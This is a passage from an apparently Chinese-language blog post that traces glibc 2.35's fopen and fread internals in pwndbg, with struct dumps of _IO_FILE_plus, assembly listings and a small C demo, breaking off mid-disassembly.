plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d469 &lt;_IO_link_in+409&gt;    call   __libc_cleanup_pop_restore  &lt;__libc_cleanup_pop_restore&gt;</span><br></pre></td></tr></table></figure><p>然后又是一些操作，回到<code>_IO_new_file_init_internal</code>函数，这时我们看创建的<code>_IO_FILE_plus</code>的状态<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$5 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现其<code>_chain</code>域指向了<code>_IO_2_1_stderr_</code>，我们再看<code>_IO_list_all</code>指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$6 = (struct _IO_FILE_plus *) 0x5555555592a0</span><br></pre></td></tr></table></figure><p>正指向我们创建的<code>_IO_FILE_plus</code>结构体，所以<code>_IO_link_in</code>正是把我们创建的<code>_IO_FILE_plus</code>结构体加入<code>_IO_list_all</code>全局链表中<br>然后<code>_IO_new_file_init_internal</code>将<code>_fileno</code>域设置为-1，接着回到<code>_IO_new_fopen</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be2e &lt;_IO_new_file_init_internal+30&gt;    mov    dword ptr [rbx + 0x70], 0xffffffff             [0x555555559310] &lt;= 0xffffffff</span><br><span class="line">0x7ffff7c8be35 &lt;_IO_new_file_init_internal+37&gt;    pop    rbx                                            RBX =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8be36 &lt;_IO_new_file_init_internal+38&gt;    ret                                &lt;fopen64+107&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$7 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = -1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用<code>_IO_file_fopen</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f6a9 &lt;fopen64+121&gt;                      call   _IO_file_fopen              &lt;_IO_file_fopen&gt;</span><br></pre></td></tr></table></figure><p>其进行一些操作后调用<code>open64</code>函数，真正打开文件<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7c8c0b1 &lt;_IO_file_open+33&gt;    call   open64                      &lt;open64&gt;</span><br><span class="line">        file: 0x555555556007 ◂— &#x27;test.txt&#x27;</span><br><span class="line">        oflag: 0x241</span><br><span class="line">        vararg: 0x1b6</span><br></pre></td></tr></table></figure><p><code>open64</code>返回<code>_IO_file_fopen</code>后，<code>_IO_file_fopen</code>进行一些操作，设置了<code>_fileno</code>域（文件描述符）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c0b9 &lt;_IO_file_open+41&gt;    test   r12d, r12d     3 &amp; 3     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c0bc &lt;_IO_file_open+44&gt;  ✘ js     _IO_file_open+192           &lt;_IO_file_open+192&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8c0c2 &lt;_IO_file_open+50&gt;    mov    eax, dword ptr [rbx]             EAX, [0x5555555592a0] =&gt; 0xfbad248c</span><br><span class="line">0x7ffff7c8c0c4 &lt;_IO_file_open+52&gt;    mov    edx, ebp                         EDX =&gt; 4</span><br><span class="line">0x7ffff7c8c0c6 &lt;_IO_file_open+54&gt;    and    ebp, 0x1004                      EBP =&gt; 4 (0x4 &amp; 0x1004)</span><br><span class="line">0x7ffff7c8c0cc &lt;_IO_file_open+60&gt;    mov    dword ptr [rbx + 0x70], r12d     [0x555555559310] &lt;= 3</span><br><span class="line">0x7ffff7c8c0d0 &lt;_IO_file_open+64&gt;    and    edx, 0x100c                      EDX =&gt; 4 (0x4 &amp; 0x100c)</span><br><span class="line">0x7ffff7c8c0d6 &lt;_IO_file_open+70&gt;    and    eax, 0xffffeff3                  EAX =&gt; 0xfbad2480 (0xfbad248c &amp; 0xffffeff3)</span><br><span class="line">0x7ffff7c8c0db &lt;_IO_file_open+75&gt;    or     eax, edx                         EAX =&gt; 0xfbad2484 (0xfbad2480 | 0x4)</span><br><span class="line">0x7ffff7c8c0dd &lt;_IO_file_open+77&gt;     mov    dword ptr [rbx], eax             [0x5555555592a0] &lt;= 0xfbad2484</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$11 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见<code>_fileno</code>已经被设置为3，<code>_IO_file_fopen</code>函数还设置了缓冲区等<br>后续再次调用<code>_IO_link_in</code>，应该是确保结构体状态的更新<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c0df &lt;_IO_file_open+79&gt;     cmp    ebp, 0x1004                      0x4 - 0x1004     EFLAGS =&gt; 0x287 [ CF PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8c0e5 &lt;_IO_file_open+85&gt;   ✔ jne    _IO_file_open+144           &lt;_IO_file_open+144&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8c120 &lt;_IO_file_open+144&gt;    mov    rdi, rbx                 RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8c123 &lt;_IO_file_open+147&gt;    call   _IO_link_in                 &lt;_IO_link_in&gt;</span><br></pre></td></tr></table></figure><p>后续调用了一些字符串解析函数，最后回到<code>_IO_new_fopen</code>函数，最后回到main函数结束<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f6b3 &lt;fopen64+131&gt;    test   byte ptr [rbx + 0x74], 1     0 &amp; 1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c7f6b7 &lt;fopen64+135&gt;  ✔ je     fopen64+189                 &lt;fopen64+189&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c7f6ed &lt;fopen64+189&gt;    add    rsp, 8       RSP =&gt; 0x7fffffffdca8 (0x7fffffffdca0 + 0x8)</span><br><span class="line">0x7ffff7c7f6f1 &lt;fopen64+193&gt;    mov    rax, r12     RAX =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c7f6f4 &lt;fopen64+196&gt;    pop    rbx          RBX =&gt; 0</span><br><span class="line">0x7ffff7c7f6f5 &lt;fopen64+197&gt;    pop    rbp          RBP =&gt; 0x7fffffffdce0</span><br><span class="line">0x7ffff7c7f6f6 &lt;fopen64+198&gt;    pop    r12          R12 =&gt; 0x7fffffffddf8</span><br><span class="line">0x7ffff7c7f6f8 &lt;fopen64+200&gt;    pop    r13          R13 =&gt; 0x555555555169 (main)</span><br><span class="line">0x7ffff7c7f6fa &lt;fopen64+202&gt;    ret                                &lt;main+37&gt;</span><br></pre></td></tr></table></figure><p>看最终返回的<code>_IO_FILE_plus</code>结构体<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$15 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-fread函数"><a href="#0x03-fread函数" class="headerlink" title="0x03 fread函数"></a>0x03 fread函数</h2><p>继续用fopen使用的demo，加一个fread函数即可（glibc2.35）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    fread(ptr, <span class="number">1</span>, <span class="number">20</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fread下个断点，查看其汇编代码如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_fread:</span><br><span class="line">Address range 0x7ffff7c7fb30 to 0x7ffff7c7fc2e:</span><br><span class="line">=&gt; 0x00007ffff7c7fb30 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7fb34 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c7fb36 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c7fb38 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c7fb3a &lt;+10&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c7fb3c &lt;+12&gt;:    mov    r12,rsi</span><br><span class="line">   0x00007ffff7c7fb3f &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c7fb40 &lt;+16&gt;:    imul   r12,rdx</span><br><span class="line">   0x00007ffff7c7fb44 &lt;+20&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7fb45 &lt;+21&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c7fb49 &lt;+25&gt;:    test   r12,r12</span><br><span class="line">   0x00007ffff7c7fb4c &lt;+28&gt;:    je     0x7ffff7c7fbe1 &lt;__GI__IO_fread+177&gt;</span><br><span class="line">   0x00007ffff7c7fb52 &lt;+34&gt;:    mov    eax,DWORD PTR [rcx]</span><br><span class="line">   0x00007ffff7c7fb54 &lt;+36&gt;:    mov    r14,rdi</span><br><span class="line">   0x00007ffff7c7fb57 &lt;+39&gt;:    mov    rbp,rsi</span><br><span class="line">   0x00007ffff7c7fb5a &lt;+42&gt;:    mov    r13,rdx</span><br><span class="line">   0x00007ffff7c7fb5d &lt;+45&gt;:    mov    rbx,rcx</span><br><span class="line">   0x00007ffff7c7fb60 &lt;+48&gt;:    and    eax,0x8000</span><br><span class="line">   0x00007ffff7c7fb65 &lt;+53&gt;:    jne    0x7ffff7c7fb9b &lt;__GI__IO_fread+107&gt;</span><br><span class="line">   0x00007ffff7c7fb67 &lt;+55&gt;:    mov    r15,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c7fb70 &lt;+64&gt;:    mov    rdi,QWORD PTR [rcx+0x88]</span><br><span class="line">   0x00007ffff7c7fb77 &lt;+71&gt;:    cmp    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7fb7b &lt;+75&gt;:    je     0x7ffff7c7fb97 &lt;__GI__IO_fread+103&gt;</span><br><span class="line">   0x00007ffff7c7fb7d &lt;+77&gt;:    mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7fb82 &lt;+82&gt;:    lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7fb86 &lt;+86&gt;:    jne    0x7ffff7c7fc18 &lt;__GI__IO_fread+232&gt;</span><br><span class="line">   0x00007ffff7c7fb8c &lt;+92&gt;:    mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7fb93 &lt;+99&gt;:    mov    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7fb97 &lt;+103&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7fb9b &lt;+107&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c7fb9e &lt;+110&gt;:   mov    rsi,r14</span><br><span class="line">   0x00007ffff7c7fba1 &lt;+113&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7fba4 &lt;+116&gt;:   call   0x7ffff7c8dfd0 &lt;__GI__IO_sgetn&gt;</span><br><span class="line">   0x00007ffff7c7fba9 &lt;+121&gt;:   test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c7fbaf &lt;+127&gt;:   jne    0x7ffff7c7fbd4 &lt;__GI__IO_fread+164&gt;</span><br><span class="line">   0x00007ffff7c7fbb1 &lt;+129&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7fbb8 &lt;+136&gt;:   mov    ecx,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c7fbbb &lt;+139&gt;:   lea    edx,[rcx-0x1]</span><br><span class="line">   0x00007ffff7c7fbbe &lt;+142&gt;:   mov    DWORD PTR [rdi+0x4],edx</span><br><span class="line">   0x00007ffff7c7fbc1 &lt;+145&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c7fbc3 &lt;+147&gt;:   jne    0x7ffff7c7fbd4 &lt;__GI__IO_fread+164&gt;</span><br><span class="line">   0x00007ffff7c7fbc5 &lt;+149&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c7fbcd &lt;+157&gt;:   xchg   DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7fbcf &lt;+159&gt;:   cmp    edx,0x1</span><br><span class="line">   0x00007ffff7c7fbd2 &lt;+162&gt;:   jg     0x7ffff7c7fc00 &lt;__GI__IO_fread+208&gt;</span><br><span class="line">   0x00007ffff7c7fbd4 &lt;+164&gt;:   cmp    r12,rax</span><br><span class="line">   0x00007ffff7c7fbd7 &lt;+167&gt;:   je     0x7ffff7c7fbf8 &lt;__GI__IO_fread+200&gt;</span><br><span class="line">   0x00007ffff7c7fbd9 &lt;+169&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c7fbdb &lt;+171&gt;:   div    rbp</span><br><span class="line">   0x00007ffff7c7fbde &lt;+174&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c7fbe1 &lt;+177&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c7fbe5 &lt;+181&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c7fbe8 &lt;+184&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7fbe9 &lt;+185&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7fbea &lt;+186&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7fbec &lt;+188&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c7fbee &lt;+190&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c7fbf0 &lt;+192&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c7fbf2 &lt;+194&gt;:   ret</span><br><span class="line">   0x00007ffff7c7fbf3 &lt;+195&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7fbf8 &lt;+200&gt;:   mov    r12,r13</span><br><span class="line">   0x00007ffff7c7fbfb &lt;+203&gt;:   jmp    0x7ffff7c7fbe1 &lt;__GI__IO_fread+177&gt;</span><br><span class="line">   0x00007ffff7c7fbfd &lt;+205&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c7fc00 &lt;+208&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c7fc05 &lt;+213&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c7fc0a &lt;+218&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c7fc0f &lt;+223&gt;:   jmp    0x7ffff7c7fbd4 &lt;__GI__IO_fread+164&gt;</span><br><span class="line">   0x00007ffff7c7fc11 &lt;+225&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c7fc18 &lt;+232&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c7fc1d &lt;+237&gt;:   jmp    0x7ffff7c7fb8c &lt;__GI__IO_fread+92&gt;</span><br><span class="line">   0x00007ffff7c7fc22 &lt;+242&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c7fc26 &lt;+246&gt;:   mov    rbp,rax</span><br><span class="line">   0x00007ffff7c7fc29 &lt;+249&gt;:   jmp    0x7ffff7c2910f &lt;__GI__IO_fread.cold&gt;</span><br><span class="line">Address range 0x7ffff7c2910f to 0x7ffff7c29145:</span><br><span class="line">   0x00007ffff7c2910f &lt;-354849&gt;:        test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c29115 &lt;-354843&gt;:        jne    0x7ffff7c2913d &lt;__GI__IO_fread-354803&gt;</span><br><span class="line">   